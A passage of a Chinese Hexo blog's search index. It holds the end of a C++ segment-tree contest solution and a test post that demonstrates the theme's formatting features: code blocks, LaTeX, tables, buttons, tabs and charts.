class="line">    <span class="keyword">while</span> (a &lt;= b)&#123;</span><br><span class="line">        <span class="keyword">if</span> (a &amp; <span class="number">1</span>)&#123;<span class="built_in">combine</span>(l, node[a], t); l = t; a++;&#125;</span><br><span class="line">        <span class="keyword">if</span> (!(b &amp; <span class="number">1</span>))&#123;<span class="built_in">combine</span>(node[b], r, t); r = t; b--;&#125;</span><br><span class="line">        a &gt;&gt;= <span class="number">1</span>, b &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">combine</span>(l, r, t);</span><br><span class="line">    <span class="keyword">return</span> t.sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> T, N, i, a, b, type;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;N, &amp;T);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, buf + i);</span><br><span class="line">        node[P + i] = &#123;i, i, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = P - <span class="number">1</span>; i &gt; <span class="number">0</span>; i--) <span class="built_in">combine</span>(node[i &lt;&lt; <span class="number">1</span>], node[(i &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>], node[i]);</span><br><span class="line">    <span class="keyword">while</span> (T--)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d&quot;</span>, &amp;type, &amp;a, &amp;b);</span><br><span class="line">        <span class="keyword">if</span> (type == <span class="number">1</span>)&#123;</span><br><span class="line">            a--; buf[a] = b;</span><br><span class="line">            node[P + a] = &#123;a, a, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>&#125;;</span><br><span class="line">            b = P + a;</span><br><span class="line">            <span class="keyword">while</span> (b &gt; <span class="number">1</span>)&#123;b &amp;= <span class="number">-2</span>; <span class="built_in">combine</span>(node[b], node[b + <span class="number">1</span>], node[b &gt;&gt; <span class="number">1</span>]); b &gt;&gt;= <span class="number">1</span>;&#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, <span class="built_in">calc</span>(a + P - <span class="number">1</span>, b + P - <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> acm </tag>
            
            <tag> cf </tag>
            
            <tag> 题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客支持性测试</title>
      <link href="/2021/09/05/TestPost/"/>
      <url>/2021/09/05/TestPost/</url>
      
        <content type="html"><![CDATA[<h1 id="hexo博客支持性测试"><a href="#hexo博客支持性测试" class="headerlink" title="hexo博客支持性测试"></a>hexo博客支持性测试</h1><blockquote><p>这是一个引用</p></blockquote><hr><h2 id="文字测试"><a href="#文字测试" class="headerlink" title="文字测试"></a>文字测试</h2><p><em>斜体</em>, <strong>粗体</strong>, <strong><em>粗斜体</em></strong>, <del>删除线</del>, <a href="/" title="原地tp">超链接</a><br><u>下划线</u>, <emp>强调</emp>, <wavy>波浪线</wavy>, <del>删除线2</del>, <kbd>CTRL</kbd>+<kbd>C</kbd>, <psw>刮刮乐</psw></p><p>嵌入代码: <code>MessageBoxW(hWnd, L&quot;Hello world!&quot;, L&quot;Tips&quot;, MB_ICONASTERISK)</code></p><p>标签: <mark class="hl-label green">成功</mark> <mark class="hl-label orange">警告</mark> <mark class="hl-label red">危险</mark> <mark class="hl-label pink">提示</mark> <mark class="hl-label purple">重要</mark> <mark class="hl-label blue">信息</mark> <mark class="hl-label default">默认</mark> </p><p>彩色文字: <span class='p red'>红色</span>、<span class='p yellow'>黄色</span>、<span class='p green'>绿色</span>、<span class='p cyan'>青色</span>、<span class='p blue'>蓝色</span>、<span class='p gray'>灰色</span>。<br>超大号文字:<br><span class='p center logo large'>Volantis</span><br><span class='p center small'>A Wonderful Theme for Hexo</span></p><div class="note info flat"><p><strong>提示</strong></p><p><code>MessageBoxW</code> 用于显示一个对话框.</p></div><h2 id="代码-公式测试"><a href="#代码-公式测试" class="headerlink" title="代码/公式测试"></a>代码/公式测试</h2><h3 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Hello world!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Hello = <span class="literal">true</span></span><br><span class="line"><span class="keyword">for</span> k, _ <span class="keyword">in</span> <span class="built_in">_G</span> <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">print</span>(k)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h3 id="折叠的信息"><a href="#折叠的信息" class="headerlink" title="折叠的信息"></a>折叠的信息</h3><div class='spoiler collapsed'>    <div class='spoiler-title'>        更多    </div>    <div class='spoiler-content'>        <p><em>这事折叠的信息</em></p>    </div></div><h3 id="LaTeX-公式"><a href="#LaTeX-公式" class="headerlink" title="LaTeX 公式:"></a>LaTeX 公式:</h3><script type="math/tex; mode=display">x=\frac{-b\pm\sqrt{b^2-4ac}}{2a}</script><script type="math/tex; mode=display">A = \begin{bmatrix}  a_{11} & a_{12} & ...    & a_{1n} \\  a_{21} & a_{22} & ...    & a_{2n} \\  a_{31} & a_{22} & ...    & a_{3n} \\  \vdots & \vdots & \ddots & \vdots \\  a_{n1} & a_{n2} & ...    & a_{nn} \\\end{bmatrix} , b = \begin{bmatrix}  b_{1}  \\  b_{2}  \\  b_{3}  \\  \vdots \\  b_{n}  \\\end{bmatrix}</script><p>行内公式: $ \int_{0}^{\pi}{\sin x \mathrm{d} x} = 2 $</p><h2 id="组件测试"><a href="#组件测试" class="headerlink" title="组件测试"></a>组件测试</h2><h3 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h3><p>一些<code>Hello World</code></p><div class="table-container"><table><thead><tr><th style="text-align:center">语言</th><th>代码</th></tr></thead><tbody><tr><td style="text-align:center">C</td><td><code>puts(&quot;Hello World!&quot;);</code></td></tr><tr><td style="text-align:center">C++</td><td><code>std::cout &lt;&lt; &quot;Hello World!&quot; &lt;&lt; std::endl;</code></td></tr><tr><td style="text-align:center">Python</td><td><code>print(&quot;Hello World!&quot;)</code></td></tr><tr><td style="text-align:center">Go</td><td><code>fmt.Println(&quot;Hello World!&quot;)</code></td></tr><tr><td style="text-align:center">BatchScript</td><td><code>echo Hello World!</code></td></tr><tr><td style="text-align:center"><del>brainfuck</del></td><td><code>++++++++++[&gt;+++++++&gt;++++++++++&gt;+++&gt;+&lt;&lt;&lt;&lt;-]&gt;++.&gt;+.+++++++..+++.&gt;++.&lt;&lt;+++++++++++++++.&gt;.+++.------.--------.&gt;+.&gt;.</code></td></tr></tbody></table></div><h3 id="按钮"><a href="#按钮" class="headerlink" title="按钮"></a>按钮</h3><p><button class="btn-beautify" onclick="alert('Hello World!')">内嵌html</button><br></p><a class="btn-beautify button--animated 标题" href="/"   title="链接按钮"><i class="iconfont icon-qq"></i><span>链接按钮</span></a><div class="tag link"><a class="link-card" title="糖果屋的扩展插件" href="https://akilar.top/posts/615e2dec/"><div class="left"><img src="https://cdn.jsdelivr.net/gh/Akilarlxh/akilarlxh.github.io/img/siteicon/favicon.ico"/></div><div class="right"><p class="text">糖果屋的扩展插件</p><p class="url">https://akilar.top/posts/615e2dec/</p></div></a></div><div class='checkbox'><input type="checkbox" />            <p>纯文本测试</p>            </div><div class='checkbox checked'><input type="checkbox" checked="checked"/>            <p>支持简单的 <a href="https://guides.github.com/features/mastering-markdown/">markdown</a> 语法</p>            </div><div class='checkbox red'><input type="checkbox" />            <p>支持自定义颜色</p>            </div><div class='checkbox green checked'><input type="checkbox" checked="checked"/>            <p>绿色 + 默认选中</p>            </div><div class='checkbox plus green checked'><input type="checkbox" checked="checked"/>            <p>增加</p>            </div><div class='checkbox minus yellow checked'><input type="checkbox" checked="checked"/>            <p>减少</p>            </div><div class='checkbox times red checked'><input type="checkbox" checked="checked"/>            <p>叉</p>            </div><div class='checkbox red'><input type="radio" />            <p>红色</p>            </div><div class='checkbox yellow'><input type="radio" />            <p>黄色</p>            </div><h3 id="卡片"><a href="#卡片" class="headerlink" title="卡片"></a>卡片</h3><div class="site-card-group"><a class="site-card" href="https://polyhaven.com/"><div class="img"><img src="https://file.coffee/u/713wQ2ObhOtAF-.jpg"/></div><div class="info"><img src="https://polyhaven.com/Logo%20256.png"/><span class="title">PolyHaven</span><span class="desc">3D素材网站</span></div></a><a class="site-card" href="https://www.ghxi.com/"><div class="img"><img src="https://img.lovestu.com/uploads/2019/02/dlbj.jpg"/></div><div class="info"><img src="https://www.ghxi.com/favicon.ico"/><span class="title">ghboke</span><span class="desc">果核剥壳</span></div></a></div><h3 id="选项卡"><a href="#选项卡" class="headerlink" title="选项卡"></a>选项卡</h3><div class="tabs" id="解决方案"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#解决方案-1">解决方案 1</button></li><li class="tab"><button type="button" data-href="#解决方案-2">解决方案 2</button></li><li class="tab"><button type="button" data-href="#解决方案-3">解决方案 3</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="解决方案-1"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Code for solution #1 */</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="解决方案-2"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Code for solution #2 */</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="解决方案-3"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Code for solution #3 */</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h3 id="饼图"><a href="#饼图" class="headerlink" title="饼图"></a>饼图</h3><div class="mermaid">pie&quot;Dogs&quot; : 386&quot;Cats&quot; : 85&quot;Rats&quot; : 15</div><h3 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h3><div class="mermaid">graph TDA[Hard] --&gt;|Text| B(Round)B --&gt; C{Decision}C --&gt;|One| D[Result 1]C --&gt;|Two| E[Result 2]</div><h2 id="资源测试"><a href="#资源测试" class="headerlink" title="资源测试"></a>资源测试</h2><h3 id="图片组"><a href="#图片组" class="headerlink" title="图片组"></a>图片组</h3><div class="justified-gallery"><p><img src="nul" alt=""><br><img src="/img/friend_404.gif" alt=""><br><img src="/img/404.jpg" alt=""></p>          </div><h3 id="附件"><a href="#附件" class="headerlink" title="附件"></a>附件</h3><a href="/archives/firstc.cpp"><i class="iconfont icon-archive-c"></i>firstc.cpp</a><br><a href="/archives/counter.exe.gz"><i class="iconfont icon-archive-c"></i>计时器小程序</a><br><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://akilar.top/posts/615e2dec/">糖果屋的扩展插件</a></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 测试 </tag>
            
            <tag> 水帖 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
